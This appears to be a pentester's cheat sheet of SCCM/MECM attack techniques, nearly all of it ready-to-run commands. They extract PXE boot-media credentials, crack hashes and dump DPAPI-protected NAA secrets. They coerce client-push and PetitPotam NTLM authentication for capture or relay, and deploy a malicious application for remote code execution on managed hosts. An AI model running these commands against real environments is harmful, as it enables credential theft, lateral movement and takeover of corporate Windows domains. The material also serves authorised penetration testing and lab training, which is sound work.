# SCCM / MECM Attacks

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

### PXE Boot Image Credential Extraction (PXEThief) [added: 2026-04]
- **Tags:** #SCCM #PXE #PXEThief #BootImage #DomainJoinCreds #TFTP #T1556
- **Trigger:** SCCM PXE boot service detected (port 4011/UDP or DHCP option 66)
- **Prereq:** Network access to SCCM PXE server; TFTP access
- **Yields:** Domain join credentials from PXE boot media (machine account or deployment account)
- **Opsec:** Med
- **Context:** SCCM PXE boot enabled without password protection or with a crackable password. Extract domain join credentials from boot media.
- **Payload/Method:**
  ```bash
  # Step 1: Enumerate PXE boot images
  python pxethief.py 2 <SCCM_PXE_IP>

  # Step 2: Download boot variable file via TFTP
  tftp -i <SCCM_PXE_IP> GET "\SMSTemp\<TIMESTAMP>.{<GUID>}.boot.var" "<TIMESTAMP>.{<GUID>}.boot.var"

  # Step 3: Attempt to decrypt without password (unprotected PXE)
  python pxethief.py 5 './<TIMESTAMP>.{<GUID>}.boot.var'

  # Step 4: If password-protected, crack the hash
  hashcat -m 19850 --force -a 0 hash /usr/share/wordlists/rockyou.txt

  # Step 5: Decrypt with recovered password
  python pxethief.py 3 './<TIMESTAMP>.{<GUID>}.boot.var' "<PASSWORD>"
  ```

### SCCMHunter — Discovery and Enumeration [added: 2026-04]
- **Tags:** #SCCM #SCCMHunter #MECMEnum #SiteServer #LinuxAttack #ProxyChains #T1018
- **Trigger:** SCCM infrastructure suspected in environment; enumerating from Linux
- **Prereq:** Valid domain credentials; network/SOCKS access to SCCM infrastructure
- **Yields:** SCCM server discovery, site codes, managed devices, and infrastructure mapping
- **Opsec:** Med
- **Context:** Enumerate SCCM infrastructure from Linux attack host through a SOCKS proxy.
- **Payload/Method:**
  ```bash
  # Find SCCM servers
  proxychains4 -q python3 sccmhunter.py find -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <DC_IP>

  # Show all gathered info
  python3 sccmhunter.py show -all

  # SMB enumeration and save
  proxychains4 -q python3 sccmhunter.py smb -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <DC_IP> -save
  ```

### SCCMHunter — Admin Console Access [added: 2026-04]
- **Tags:** #SCCM #SCCMHunter #AdminConsole #RemoteAdmin #AppDeployment #ScriptExec #T1072
- **Trigger:** SCCM admin access obtained or Full Administrator role identified
- **Prereq:** SCCM Full Administrator role or equivalent; network access to SCCM management point
- **Yields:** Remote SCCM admin console for application deployment, script execution, and collection management
- **Opsec:** Med
- **Context:** Access SCCM admin console functionality remotely to deploy applications or run scripts.
- **Payload/Method:**
  ```bash
  # Basic admin access
  proxychains4 -q python3 sccmhunter.py admin -u <USER> -p <PASSWORD> -ip <SCCM_IP>

  # With machine account auth
  proxychains4 -q python3 sccmhunter.py admin -u <USER> -p '<PASSWORD>' -ip <SCCM_IP> -au '<COMPUTER_NAME>' -ap <COMPUTER_PASSWORD>

  # With NTLM hash
  proxychains4 -q -f <PROXY_CONF> python3 sccmhunter.py admin -u '<USER>' -p <NTLM_HASH> -ip <SCCM_IP>
  ```

### SCCMHunter — DPAPI Secret Extraction via WMI [added: 2026-04]
- **Tags:** #SCCM #SCCMHunter #DPAPI #WMI #NAACredentials #TaskSequence #T1555
- **Trigger:** SCCM server compromised; extracting stored secrets
- **Prereq:** Admin access to SCCM server; WMI access; valid credentials
- **Yields:** DPAPI-protected secrets (NAA credentials, task sequence secrets) from SCCM server
- **Opsec:** Med
- **Context:** Extract DPAPI-protected secrets from SCCM server (NAA credentials, task sequence secrets).
- **Payload/Method:** `proxychains4 -q python3 sccmhunter.py dpapi -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <DC_IP> -target <SCCM_IP> -wmi`

### SCCM Client Push Coercion (SharpSCCM + Inveigh) [added: 2026-04]
- **Tags:** #SCCM #SharpSCCM #ClientPush #Inveigh #NTLMCapture #Coercion #T1187
- **Trigger:** SCCM client push installation enabled; controlled host on network
- **Prereq:** Controlled host on SCCM-managed network; SharpSCCM and Inveigh binaries
- **Yields:** NTLM hash of SCCM client push installation account (often high-privilege)
- **Opsec:** Med
- **Context:** Trigger SCCM client push installation to a controlled host. The SCCM server authenticates to the target with a privileged account — capture with Inveigh or relay.
- **Payload/Method:**
  ```powershell
  # Start Inveigh to capture the push account hash
  .\Inveigh.exe

  # Trigger client push to our controlled host
  .\SharpSCCM.exe invoke client-push -t <CONTROLLED_HOST_IP>
  ```

### SharpSCCM — Device and User Enumeration [added: 2026-04]
- **Tags:** #SCCM #SharpSCCM #DeviceEnum #PrimaryUser #ResourceID #WMI #T1018
- **Trigger:** SCCM admin access; enumerating managed devices and users
- **Prereq:** SCCM admin access; SharpSCCM binary; WMI access to site server
- **Yields:** List of SCCM-managed devices, their primary users, IPs, and resource IDs
- **Opsec:** Low
- **Context:** Enumerate SCCM-managed devices and primary users from a Windows host with SCCM admin access.
- **Payload/Method:**
  ```powershell
  # List all devices
  .\SharpSCCM.exe get devices -n <SCCM_SERVER> -sms <SITE_SERVER_IP>

  # Get class instances (e.g., SMS_R_System)
  .\SharpSCCM.exe get class-instances SMS_R_System -p Name -p SMSUniqueIdentifier -p ResourceId -p IPAddresses -sms <SITE_SERVER_IP>

  # Get primary users for a user
  .\SharpSCCM.exe get primary-users -u <USER> -sms <SITE_SERVER_IP>

  # Filter devices by condition
  .\SharpSCCM.exe get devices -w "Name like '%TARGET%'" -sms <SITE_SERVER_IP>
  ```

### SharpSCCM — Application Deployment for Code Execution [added: 2026-04]
- **Tags:** #SCCM #SharpSCCM #AppDeployment #RCE #CollectionAbuse #DeviceCollection #T1072
- **Trigger:** SCCM admin access obtained; need RCE on specific managed hosts
- **Prereq:** SCCM Full Administrator role; SharpSCCM binary; target device known
- **Yields:** Remote code execution on SCCM-managed hosts via application deployment
- **Opsec:** High
- **Context:** Deploy a malicious application to a specific device collection for RCE on SCCM-managed hosts.
- **Payload/Method:**
  ```powershell
  # Step 1: Create malicious application
  .\SharpSCCM.exe new application -s -n MalApp -p "C:\Windows\Temp\payload.exe" -sms <SITE_SERVER_IP>

  # Step 2: Create device collection
  .\SharpSCCM.exe new collection -n "TargetCollection" -t device -sms <SITE_SERVER_IP>

  # Step 3: Add target device to collection
  .\SharpSCCM.exe new collection-member -d <DEVICE_NAME> -n "TargetCollection" -t device -sms <SITE_SERVER_IP>

  # Step 4: Deploy application to collection
  .\SharpSCCM.exe new deployment -a MalApp -c "TargetCollection" -sms <SITE_SERVER_IP>

  # Step 5: Force collection update (speed up deployment)
  .\SharpSCCM.exe invoke update -n "TargetCollection" -sms <SITE_SERVER_IP>
  ```

### SCCM Lateral Movement via PetitPotam + Relay [added: 2026-04]
- **Tags:** #SCCM #PetitPotam #NTLMRelay #ProxyChains #LateralMovement #MachineAuth #T1557
- **Trigger:** SCCM server identified; can coerce its authentication via PetitPotam
- **Prereq:** Valid domain credentials; SOCKS proxy to SCCM network; PetitPotam tool
- **Yields:** Relayed SCCM server machine account authentication for lateral movement
- **Opsec:** Med
- **Context:** Coerce SCCM server auth via PetitPotam through a proxy, relay to other targets.
- **Payload/Method:** `proxychains4 -f <PROXY_CONF> python3 PetitPotam.py -u <USER> -p '<PASSWORD>' -d '<DOMAIN>' <PROXY_IP> <SCCM_IP>`

### Add Machine Account for SCCM Abuse [added: 2026-04]
- **Tags:** #SCCM #MachineAccount #addcomputer #RBCD #SCCMAuth #ComputerCreation #T1136
- **Trigger:** Need a machine account for SCCM admin operations or RBCD abuse
- **Prereq:** Valid domain credentials; MachineAccountQuota > 0
- **Yields:** New machine account for use as authentication principal in SCCM attacks
- **Opsec:** Med
- **Context:** Create a machine account to use as authentication principal for SCCM admin operations or RBCD abuse.
- **Payload/Method:** `proxychains4 -q addcomputer.py -computer-name '<NAME>' -computer-pass '<PASS>' -dc-ip <DC_IP> '<DOMAIN>/<USER>':'<PASSWORD>'`
